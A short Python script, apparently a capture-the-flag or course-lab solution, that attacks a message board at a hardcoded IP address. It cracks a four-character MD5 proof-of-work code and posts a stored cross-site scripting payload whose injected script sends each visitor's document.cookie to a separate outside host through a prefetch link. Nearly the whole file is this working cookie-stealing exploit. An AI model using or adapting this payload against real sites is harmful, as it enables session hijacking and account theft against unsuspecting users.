# -*- utf-8 -*-
# @Time : 2020/1/8
# @Author : yaozh16
# @File : messageboard.py 
# @Software: PyCharm
# @Description:


from md5 import decrypt_md5,md5
import requests

if __name__ == "__main__":
    dst_url="http://202.112.51.130:28016/"
    sess = requests.session()
    response = sess.get(dst_url)
    print(sess.cookies)
    md5_value = response.text.split("substr(md5($code),0,4) =='")[1][:4]
    decrypted = decrypt_md5(md5_value)
    data = {
        "message" : '<script>'
                    'var i=document.createElement("link");'
                    'i.setAttribute("rel","prefetch");'
                    'i.setAttribute("href","http://167.172.222.107:29030/?"+document.cookie);'
                    'document.head.appendChild(i);'
                    '</script>',
        "code" : "{}".format(decrypted)
    }
    response = sess.post(dst_url+"/send.php?", data=data)
    print(response.text.split("\n")[0])
    print(sess.cookies)
    with open("response.html",'w',encoding="utf8") as f:
        f.write(response.text)
        f.close()
    pass